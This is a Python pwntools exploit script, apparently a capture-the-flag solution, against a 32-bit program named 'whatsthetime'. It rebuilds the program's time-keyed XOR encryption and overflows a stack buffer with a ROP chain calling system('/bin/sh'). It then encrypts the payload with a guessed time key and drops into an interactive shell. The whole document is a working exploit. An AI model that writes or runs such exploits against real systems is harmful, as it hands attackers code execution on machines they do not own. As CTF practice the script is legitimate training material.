#!/usr/bin/env python3
from pwn import *
import time as time_module

context.arch = 'i386'

#This is the same encryption method used in the program.
def encrypt(plaintext, key):
    result = bytearray(plaintext)
    for byte_chunk in range(0, len(result), 4):
        for current_byte in range(4):
            if byte_chunk + current_byte < len(result):
                key_byte = (key >> (current_byte * 8)) & 0xFF
                result[byte_chunk + current_byte] ^= key_byte
        key += 1
    return bytes(result)

file = 'whatsthetime'
p = process(file)
#p = remote('localhost', 3000) used for testing purposes

elf = ELF(file)

p.recvuntil(b'time is: ')
p.recvline()

#Time is taken at launch and the seconds are removed
custom_time = int(time_module.time())
custom_time = (custom_time // 60) * 60

#Find binsh in the program for ROP
binsh = next(elf.search(b'/bin/sh\x00'))

#Find system for ROP setup
system = elf.plt['system']  # or elf.symbols['system'] if statically linked

#Build ROP chain for 32-bit: system("/bin/sh")
payload = cyclic(64)         # fill buffer
payload += cyclic(4)         # ebp overwritten
payload += p32(system)       # system addr
payload += p32(0)            # return addr
payload += p32(binsh)        # pointer to /bin/sh

encrypted = encrypt(payload, custom_time)
p.send(encrypted)
p.interactive()
